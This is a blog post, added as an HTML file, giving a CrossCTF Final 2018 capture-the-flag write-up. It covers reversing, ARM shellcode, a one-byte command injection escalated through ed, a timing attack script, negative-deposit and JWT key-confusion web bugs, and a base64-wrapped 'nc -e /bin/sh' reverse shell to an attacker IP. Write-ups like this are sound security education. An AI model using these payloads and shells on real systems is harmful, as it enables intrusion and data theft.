@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<meta name="author" content="Alan Chang">
+		<meta name="description" content="a random blog about cybersecurity and programming">
+		<meta name="generator" content="Hugo 0.40.3" />
+		<title>Crossctf Final 2018 Writeup &middot; Alan&#39;s Blog</title>
+		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://tcode2k16.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="Alan&#39;s Blog" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://tcode2k16.github.io/blog/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://tcode2k16.github.io/blog/posts'>Archive</a>
+	<a href='https://tcode2k16.github.io/blog/tags'>Tags</a>
+	<a href='https://tcode2k16.github.io/blog/about'>About</a>
+
+	
+
+	
+	<a class="cta" href="https://tcode2k16.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        Crossctf Final 2018 Writeup
+                    </h1>
+                    <h2 class="headline">
+                    Jun 18, 2018 13:47
+                    · 1242 words
+                    · 6 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/ctf">ctf</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/cyber-security">cyber-security</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/write-up">write-up</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#perfect">Perfect</a>
+<ul>
+<li><a href="#problem">Problem</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul></li>
+<li><a href="#ftlog">FTLOG</a>
+<ul>
+<li><a href="#problem-1">Problem</a></li>
+<li><a href="#solution-1">Solution</a></li>
+</ul></li>
+<li><a href="#sanity">Sanity</a>
+<ul>
+<li><a href="#problem-2">Problem</a></li>
+<li><a href="#solution-2">Solution</a></li>
+</ul></li>
+<li><a href="#the-evilness">The Evilness</a>
+<ul>
+<li><a href="#problem-3">Problem</a></li>
+<li><a href="#solution-3">Solution</a></li>
+</ul></li>
+<li><a href="#fitblips">Fitblips</a>
+<ul>
+<li><a href="#problem-4">Problem</a></li>
+<li><a href="#solution-4">Solution</a></li>
+</ul></li>
+<li><a href="#gocoin">GoCoin!</a>
+<ul>
+<li><a href="#problem-5">Problem</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul></li>
+<li><a href="#gocoin-plus">GoCoin! Plus</a>
+<ul>
+<li><a href="#problem-6">Problem</a></li>
+<li><a href="#solution-6">Solution</a></li>
+</ul></li>
+<li><a href="#gocoin-plus-plus">GoCoin! Plus Plus</a>
+<ul>
+<li><a href="#problem-7">Problem</a></li>
+<li><a href="#solution-7">Solution</a></li>
+</ul></li>
+<li><a href="#the-terminal">The Terminal</a>
+<ul>
+<li><a href="#problem-8">Problem</a></li>
+<li><a href="#solution-8">Solution</a></li>
+</ul></li>
+<li><a href="#cachecreek">CacheCreek</a>
+<ul>
+<li><a href="#problem-9">Problem</a></li>
+<li><a href="#solution-9">Solution</a></li>
+</ul></li>
+<li><a href="#other-resources">Other resources</a></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h1 id="perfect">Perfect</h1>
+
+<h2 id="problem">Problem</h2>
+
+<p>&lsquo;Cause we lost it all Nothin&rsquo; lasts forever</p>
+
+<p>Creator - amon (@nn_amon) Update: this definitely works with python 2.7.15</p>
+
+<p><a href="/blog/crossctf-final-2018-writeup/Perfect/perfect">perfect</a></p>
+
+<h2 id="solution">Solution</h2>
+
+<p>I went through the assembly code line by line converting it into something more readable:</p>
+
+<pre><code>local_420h = 2^213
+
+get local_410h
+local_440h = int(local_410h, 10) - 1
+local_430h = int(local_410h, 10)
+
+do {
+  if (local_430h%local_440h == 0) {
+    local_460h += local_440h
+  }
+  local_440h -= 1
+} while (local_440h &gt;= 0)
+
+if (local_460h == local_430h &amp;&amp; local_430h &gt; local_420h) {
+  // local_460h
+  // WIN
+}
+</code></pre>
+
+<p>In summary, the program need a <a href="https://en.wikipedia.org/wiki/Perfect_number">perfect number</a> with a bit length larger than <code>213</code>.</p>
+
+<p>By searching <a href="http://mathforum.org/library/drmath/view/51516.html">online</a>, I found the number to be <code>14474011154664524427946373126085988481573677491474835889066354349131199152128</code>.</p>
+
+<pre><code class="language-python">import random
+
+random.seed(a=14474011154664524427946373126085988481573677491474835889066354349131199152128)
+
+k = &quot;&quot;.join([hex(random.randint(0, 255))[2:] for i in range(35)])
+
+print(k)
+</code></pre>
+
+<p>This gives us the hex: <code>363c49bfa7f2ebe9c888d5d32be6ede8c1bfa2d9aea7595ff4419792896b96cfd2e1a6</code></p>
+
+<p>Then xoring that with <code>754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db</code>, you get the flag.</p>
+
+<p>Flag: <code>CrossCTF{why_am_1_aw4ke_r1ght_n0ww}</code></p>
+
+<h1 id="ftlog">FTLOG</h1>
+
+<h2 id="problem-1">Problem</h2>
+
+<p><a href="https://youtu.be/RW2vXFLXtps">https://youtu.be/RW2vXFLXtps</a></p>
+
+<p>nc ctf.pwn.sg 4004</p>
+
+<p>Hint: The raspberry Pis might come in handy but you can look at using qemu too.</p>
+
+<p>Creator - amon (@nn_amon)</p>
+
+<h2 id="solution-1">Solution</h2>
+
+<p>The ARM binary seems to just execute the input as shellcode.</p>
+
+<p>Code:</p>
+
+<pre><code class="language-python">from pwn import *
+
+sh = remote('ctf.pwn.sg', 4004)
+
+sh.sendline('\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78')
+sh.interactive()
+</code></pre>
+
+<p>Flag: <code>CrossCTF{slowmo_starroving_sugarforthepill_alison}</code></p>
+
+<h1 id="sanity">Sanity</h1>
+
+<h2 id="problem-2">Problem</h2>
+
+<p>Insane in the membrane.</p>
+
+<p>fXRoZzFsaHM0bGZfeW1fcjBveV8zc3U0Q3tGVENzc29yQw==</p>
+
+<h2 id="solution-2">Solution</h2>
+
+<p>Base64 decode and then reverse the order.</p>
+
+<p>Flag: <code>CrossCTF{C4us3_yo0r_my_fl4shl1ght}</code></p>
+
+<h1 id="the-evilness">The Evilness</h1>
+
+<h2 id="problem-3">Problem</h2>
+
+<p>Ready for something ridiculously difficult?</p>
+
+<p>nc ctf.pwn.sg 4020</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import sys
+import flag
+import signal
+import os
+import tempfile
+
+temp_file = tempfile.NamedTemporaryFile(prefix=&quot;cartoon-&quot;,
+                                        suffix=&quot;.dat&quot;,
+                                        delete=True)
+
+
+def handler(signum, frame):
+    write(&quot;Times up!&quot;)
+    temp_file.close()
+    sys.exit(0)
+
+
+def write(data, endl='\n'):
+    sys.stdout.write(data + endl)
+    sys.stdout.flush()
+
+
+def readline():
+    return sys.stdin.readline().strip()
+
+
+def main():
+    abspath = os.path.abspath(__file__)
+    dname = os.path.dirname(abspath)
+    os.chdir(dname)
+    signal.signal(signal.SIGALRM, handler)
+    signal.alarm(10)
+
+    # Write the flag to the temp file
+    temp_file.file.write(flag.flag)
+    temp_file.file.flush()
+
+    # Oh I'm sorry, did you want this?
+    del flag.flag
+
+    write(open(__file__).read())
+
+    command = &quot;/usr/bin/shred &quot; + temp_file.name
+    write(&quot;Here comes the shredder! (%s)&quot; % command)
+
+    ######################################################################
+    #
+    # INCOMING TRANSMISSION...
+    #
+    # CAREFUL AGENT. WE DO NOT HAVE MUCH TIME. I'VE OPENED A WORMHOLE IN
+    # THE FABRIC OF TIME AND SPACE TO INTRODUCE A FAULT IN ONE BYTE!
+    #
+    # MAKE USE OF IT WISELY!
+    #
+    command_fault = list(command)
+    index = int(readline())
+    byt = int(readline(), 16)
+    if (0x0 &lt;= index &lt; len(command_fault)):
+        if (0x0 &lt;= byt &lt;= 0xff):
+            command_fault[index] = chr(byt)
+            command = &quot;&quot;.join(command_fault)
+    #
+    # TRANSMISSION ENDED
+    #
+    ######################################################################
+
+    # Oooh, did you want this too? Too bad it's being... shredded.
+    os.system(command)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+
+Here comes the shredder! (/usr/bin/shred /tmp/cartoon-uoDUPm.dat)
+</code></pre>
+
+<h2 id="solution-3">Solution</h2>
+
+<p>Basicly, we can change one character in <code>/usr/bin/shred /tmp/cartoon-RANDOM.dat</code>.</p>
+
+<p>By changing <code>r</code> to a <code>;</code>, we can call <code>ed</code> a text editor with the file, using <code>p</code> we can read the file, and using <code>P</code> we can get a shell.</p>
+
+<pre><code>Here comes the shredder! (/usr/bin/shred /tmp/cartoon-xaIxJX.dat)
+11
+3B
+sh: 1: /usr/bin/sh: not found
+Newline appended
+62
+p
+LOL YOU THOUGHT THIS WOULD BE SO EASY? GET A SHELL YOU DWEEB.
+*ls
+?
+P
+*!ls
+flag
+flag.py
+requirements.txt
+theevilness.py
+!
+*!cat flag
+CrossCTF{it5_th3_r34ln3ss_th3_r3alness}
+!
+*
+</code></pre>
+
+<p>Flag: <code>CrossCTF{it5_th3_r34ln3ss_th3_r3alness}</code></p>
+
+<h1 id="fitblips">Fitblips</h1>
+
+<h2 id="problem-4">Problem</h2>
+
+<p>How many steps does your Fitblip beep?</p>
+
+<p>nc ctf.pwn.sg 4003</p>
+
+<p>Creator - amon (@nn_amon)</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import sys
+import flag
+from bitstring import BitArray
+import time
+import signal
+
+
+def write(data, endl='\n'):
+    sys.stdout.write(data + endl)
+    sys.stdout.flush()
+
+
+def readline():
+    return sys.stdin.readline().strip()
+
+
+def convert_to_bitstream(data):
+    return BitArray(bytes=data).bin
+
+
+def check(a, b, user_times):
+    bs_a = convert_to_bitstream(a)
+    bs_b = convert_to_bitstream(b)
+    bs_a = bs_a.ljust(len(bs_b), &quot;0&quot;)
+    bs_b = bs_b.ljust(len(bs_a), &quot;0&quot;)
+    counter = 0
+    for i in range(len(bs_a)):
+        if bs_a[i] != bs_b[i]:
+            return counter
+        counter += 1
+    return counter
+
+
+def main():
+    signal.alarm(4)
+
+    secret_key = flag.flag
+    write(open(__file__).read())
+    write(&quot;Password: &quot;, endl=&quot;&quot;)
+    user_supplied = readline()
+    write(&quot;How many times do you want to test: &quot;, endl=&quot;&quot;)
+    user_times_supplied = readline()
+    try:
+        int(user_supplied, 16)
+        user_data = user_supplied.decode(&quot;hex&quot;)
+        user_times = int(user_times_supplied)
+    except Exception:
+        write(&quot;Evil.&quot;)
+        return
+
+    if user_times &gt; 5000:
+        write(&quot;Too many times.&quot;)
+        return
+
+    result = len(flag.flag) * 8 * user_times
+    start = time.time()
+    for i in range(user_times):
+        result -= check(user_data, secret_key, user_times)
+    end = time.time()
+    elapsed = end - start
+
+    if result == 0:
+        write(&quot;Flag is %s&quot; % flag.flag)
+    else:
+        write(&quot;Impossible.&quot;)
+
+    write(&quot;Request completed in: %.4fs (%d)&quot; % (elapsed, result))
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+
+</code></pre>
+
+<h2 id="solution-4">Solution</h2>
+
+<p>The key to this challenge is to see that the correct flag takes longer and have a smaller <code>result</code> value.</p>
+
+<pre><code class="language-python">
+from pwn import *
+
+def attempt(bitsStr):
+  print bitsStr
+  sh = remote('ctf.pwn.sg', 4003)
+  sh.recvuntil('Password: ')
+  sh.recvuntil('Password: ')
+  sh.sendline(enhex(unbits([e for e in bitsStr.ljust(300, '0')], endian='big')))
+  sh.recvuntil(': ')
+  sh.sendline('10')
+  output = sh.recvall()
+  if (not 'Impossible.' in output.split('\n')[0]):
+    print output
+    exit(0)
+
+  return int(output.split('\n')[-2].split(' ')[-1][1:-2])
+
+password = ''
+
+while True:
+  r1 = attempt(password+'1')
+  r2 = attempt(password+'0')
+  print r1, r2
+  if (r1 &lt; r2):
+    password = password+'1'
+  else:
+    password = password+'0'
+
+</code></pre>
+
+<p>Flag: <code>CrossCTF{t1m1ng_att4ck5_r_4_th3_d3vil}</code></p>
+
+<h1 id="gocoin">GoCoin!</h1>
+
+<h2 id="problem-5">Problem</h2>
+
+<p>I thought blockchain was cool, so I made my own coin.</p>
+
+<p><a href="http://ctf.pwn.sg:8182">http://ctf.pwn.sg:8182</a></p>
+
+<p>Creator - quanyang (@quanyang)</p>
+
+<h2 id="solution-5">Solution</h2>
+
+<p>Because the deposit function doesn&rsquo;t check if <code>amount</code> is negative, by doing <code>http://ctf.pwn.sg:8182/deposit?amount=-100000</code>, we are able to buy the flag.</p>
+
+<pre><code>You deposited -100000 GoCoins! into your bank!
+You have 100001 GoCoins! in your wallet and -100000 in your bank!
+Deposit 1 GoCoins into your bank here!
+Withdraw 1 GoCoins from your bank here!
+Buy a flag for 1.337 GoCoins! here.
+</code></pre>
+
+<p>Flag: <code>CrossCTF{G0C0in_Is_Th3_Nex7_Bi5_Th@ng!}</code></p>
+
+<h1 id="gocoin-plus">GoCoin! Plus</h1>
+
+<h2 id="problem-6">Problem</h2>
+
+<p>I thought blockchain was cool, so I made my own coin.</p>
+
+<p>GoCoin! Plus is the forked and improved version of GoCoin!.</p>
+
+<p>Update: I&rsquo;ve improved it! More secures and with real cryptos, it&rsquo;s a true cryptocoin now!</p>
+
+<p><a href="http://ctf.pwn.sg:2053">http://ctf.pwn.sg:2053</a></p>
+
+<p>Creator - quanyang (@quanyang)</p>
+
+<h2 id="solution-6">Solution</h2>
+
+<p>It is the same as <code>GoCoin!</code>.</p>
+
+<p><code>http://ctf.pwn.sg:2053/deposit?amount=-100000</code> still works.</p>
+
+<p>Flag: <code>CrossCTF{GoCoin!_Cash_Is_th3_m0St_5eCur3!!!!13337}</code></p>
+
+<h1 id="gocoin-plus-plus">GoCoin! Plus Plus</h1>
+
+<h2 id="problem-7">Problem</h2>
+
+<p>I thought blockchain was cool, so I made my own coin.</p>
+
+<p>GoCoin! Plus Plus is the forked and improved version of GoCoin! Plus.</p>
+
+<p>Update: I&rsquo;ve improved it! More secures and with real cryptos, it&rsquo;s a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed!</p>
+
+<p><a href="http://ctf.pwn.sg:1389">http://ctf.pwn.sg:1389</a></p>
+
+<p>Creator - quanyang (@quanyang)</p>
+
+<p><a href="/blog/crossctf-final-2018-writeup/GoCoin!%20Plus%20Plus/source">source</a></p>
+
+<p><a href="/blog/crossctf-final-2018-writeup/GoCoin!%20Plus%20Plus/pub.rsa">pub.rsa</a></p>
+
+<h2 id="solution-7">Solution</h2>
+
+<pre><code class="language-go">token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) {
+    if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
+        key, err := jwt.ParseRSAPublicKeyFromPEM(myKey)
+        return key, err
+    }
+    return myKey, nil
+})
+</code></pre>
+
+<p>This is the part that is vulnerable. <code>myKey</code> can be both a rsa public key or a HMAC secret. Because HMAC is symmetric, we can change the info to whatever we like.</p>
+
+<p>Using this <a href="https://jwt.io/">website</a>, we can hand craft our own jwt cookie to solve the challenge.</p>
+
+
+<figure>
+    
+        <img src="/blog/crossctf-final-2018-writeup/GoCoin!%20Plus%20Plus/img.png" />
+    
+    
+</figure>
+
+
+<p>Flag: <code>CrossCTF{SORRY_I_AM_STUP!D!1!!1}</code></p>
+
+<h1 id="the-terminal">The Terminal</h1>
+
+<h2 id="problem-8">Problem</h2>
+
+<p>How long more can you stand it?</p>
+
+<p><a href="http://ctf.pwn.sg:4083">http://ctf.pwn.sg:4083</a></p>
+
+<h2 id="solution-8">Solution</h2>
+
+<p>Most features on the website are distractions (we tried to find the flag in the cake image for a long time&hellip;)</p>
+
+<p>In the end, we found <code>http://ctf.pwn.sg:4082/picturise/CMD</code> which allows us to run what ever command we like and return the output as a image.</p>
+
+<p>Here is the url that we used in the end: <code>http://ctf.pwn.sg:4082/picturise/echo%20bmMgLWUgL2Jpbi9zaCAxNjUuMjI3LjI0MC4yMDQgODA=%20%7C%20base64%20-d%20%7C%20sh</code></p>
+
+<p>It is basically <code>echo PAYLOAD | base64 -d | sh</code>, and the payload is <code>nc -e /bin/sh ATTACK_IP 80</code> which opens up a reverse shell on th server (<code>nc -nvlp 80</code> on the attack server).</p>
+
+<p>Then we can just do <code>grep -rnw '/' -e 'CrossCTF'</code> and get the flag.</p>
+
+<p>Flag: <code>CrossCTF{C4ther1ne_zet4_j0n3s_w4s_1n_l0st_1n_tr4nsl4t1on}</code></p>
+
+<h1 id="cachecreek">CacheCreek</h1>
+
+<h2 id="problem-9">Problem</h2>
+
+<p>I wrote a new cache mechanism, it is pretty cool, can you please review it for me?</p>
+
+<p><a href="http://ctf.pwn.sg:8181">http://ctf.pwn.sg:8181</a></p>
+
+<p>backup server: <a href="http://ftc1.pwn.sg:8181">http://ftc1.pwn.sg:8181</a> <a href="http://ftc2.pwn.sg:8181">http://ftc2.pwn.sg:8181</a></p>
+
+<p>Creator - quanyang (@quanyang)</p>
+
+<p><a href="/blog/crossctf-final-2018-writeup/CacheCreek/internal.php">internal.php</a></p>
+
+<p><a href="/blog/crossctf-final-2018-writeup/CacheCreek/curl.php">curl.php</a></p>
+
+<p><a href="/blog/crossctf-final-2018-writeup/CacheCreek/cache.php">cache.php</a></p>
+
+<h2 id="solution-9">Solution</h2>
+
+<pre><code class="language-php">
+...
+$debug = url_get_contents(&quot;http://127.0.0.1/internal.php?debug&quot;. session_id(), 60, &quot;index.php&quot;,['debug'=&gt;'True']);
+...
+echo htmlentities(url_get_contents(&quot;http://127.0.0.1/internal.php?&quot;. session_id(), 60, urldecode($_SERVER['HTTP_REFERER']),['view'=&gt;'admin']));
+...
+</code></pre>
+
+<p>If we append <code>debug</code> to our current session, update the profile to our payload, log back using the original session id, and call debug, we are then able to execute any command on the server.</p>
+
+<pre><code>debug command: grep -rnw '/' -e 'CrossCTF'
+
+/flag.txt:1:CrossCTF{Dont_h@te_tHe_aUth0r_hat3_d@_gam3}
+</code></pre>
+
+<p>Flag: <code>Dont_h@te_tHe_aUth0r_hat3_d@_gam3</code></p>
+
+<h1 id="other-resources">Other resources</h1>
+
+<p><a href="https://github.com/ahboon/Crossctf2018/tree/master/Writeups">ahboon/Crossctf2018</a></p>
+
+<p><a href="https://github.com/NUSGreyhats/crossctf-2018-challenges">NUSGreyhats/crossctf-2018-challenges</a></p>
+
+                </section>
+            </article>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'github-blog-14'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/tcode2k16">
+        <i class="fa fa-github-square"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+       © Copyright 2018 <i class="fa fa-heart" aria-hidden="true"></i> Alan Chang
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://tcode2k16.github.io/blog/js/jquery-3.3.1.min.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/main.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-88069322-2', 'auto');
+ga('send', 'pageview');
+</script>
+
+
+
+
+
+    </body>
+</html>
